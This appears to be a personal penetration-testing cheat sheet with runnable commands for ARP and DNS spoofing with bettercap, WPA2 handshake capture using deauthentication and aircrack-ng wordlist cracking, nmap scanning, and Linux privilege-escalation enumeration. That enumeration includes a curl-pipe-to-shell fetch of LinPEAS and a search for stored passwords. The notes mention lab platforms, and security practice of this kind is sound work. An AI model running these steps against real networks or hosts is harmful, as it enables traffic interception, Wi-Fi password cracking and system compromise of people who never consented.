// MitM Attacks with Bettercap

Last updated: 2024 · Source: Personal Notes

ARP Spoofing

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Start bettercap
sudo bettercap -iface eth0

# In bettercap REPL:
net.probe on
net.recon on
set arp.spoof.targets 192.168.1.1
arp.spoof on
net.sniff on

DNS Spoofing

# After ARP spoofing is active:
set dns.spoof.domains target.com
set dns.spoof.address YOUR_IP
dns.spoof on

Key Concepts

  • ARP has no authentication — any device can claim any IP
  • Poison both victim → gateway and gateway → victim
  • Use Wireshark to verify traffic is flowing through you
  • Always restore ARP tables after the session

// WPA2 Handshake Capture

Last updated: 2024 · Source: Personal Notes

Setup Monitor Mode

# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify
iwconfig wlan0mon

Capture Handshake

# Scan for target network
sudo airodump-ng wlan0mon

# Lock on to target
sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] -w capture wlan0mon

# Deauth to force reconnect (new terminal)
sudo aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon

# Crack with wordlist
aircrack-ng capture-01.cap -w /usr/share/seclists/Passwords/rockyou.txt

// Nmap Host Discovery

Source: Personal Notes

Essential Nmap Commands

# Ping sweep (host discovery)
nmap -sn 192.168.1.0/24

# SYN scan (stealthy, requires root)
sudo nmap -sS -p- 192.168.1.100

# Version + OS detection
sudo nmap -sV -O 192.168.1.100

# Aggressive scan
nmap -A 192.168.1.100

# Script scan (vuln detection)
nmap --script vuln 192.168.1.100

# Output to file
nmap -oN scan.txt 192.168.1.100

// Linux Privilege Escalation

Source: Personal Notes + HTB/THM

Automated Enumeration

# Run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Check sudo rights
sudo -l

# Find SUID binaries
find / -perm -4000 2>/dev/null

# Check writable cron jobs
cat /etc/crontab
ls -la /etc/cron*

Quick Wins Checklist

  • sudo -l → check nopasswd entries
  • SUID binaries → check GTFOBins
  • World-writable scripts in cron
  • Passwords in config files / history
  • Kernel exploits (uname -a)
